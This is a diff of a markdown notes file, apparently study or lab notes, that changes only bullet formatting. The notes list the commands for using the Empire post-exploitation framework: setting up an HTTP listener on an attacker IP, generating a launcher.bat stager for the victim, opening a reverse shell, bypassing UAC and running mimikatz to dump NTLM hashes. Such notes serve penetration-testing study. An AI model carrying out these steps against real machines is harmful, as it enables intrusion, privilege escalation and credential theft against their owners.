@@ -48,26 +48,26 @@
 ## Empire Commands
 * Generate the file "launcher.bat" to let the victim connect to the empire server:
     1. Use "uselistener http" to generate listener
-        - set Name http
-        - set Host 192.168.2.30 (attacker's ip)
-        - set Port 8080
-        - execute
+      * set Name http
+      * set Host 192.168.2.30 (attacker's ip)
+      * set Port 8080
+      * execute
     2. Use "usestager windows/launcher_bat" to generate the file "launcher.bat"
-        - set Listener http
-        - execute
+      * set Listener http
+      * execute
 
 * After the victim connects to the empire server, run the following commands:
     1. type "agents" to find the value of victim's Name (<victim_Name>)
     2. type "interact <victim_Name>"
     3. Reverse shell
-        - shell tasklist
-        - shell netstat
-        - shell ipconfig
+      * shell tasklist
+      * shell netstat
+      * shell ipconfig
     4. Use "usemodule privesec/bypassuac" to get administrator privilege
-        - set Listener http
-        - execute
+      * set Listener http
+      * execute
     5. Use "usemodule credentials/mimikatz/logonpasswords*" to get the victim's NTLM hash
-        - execute
+      * execute
 
 # Reference
 * https://github.com/mishmashclone/BC-SECURITY-Empire
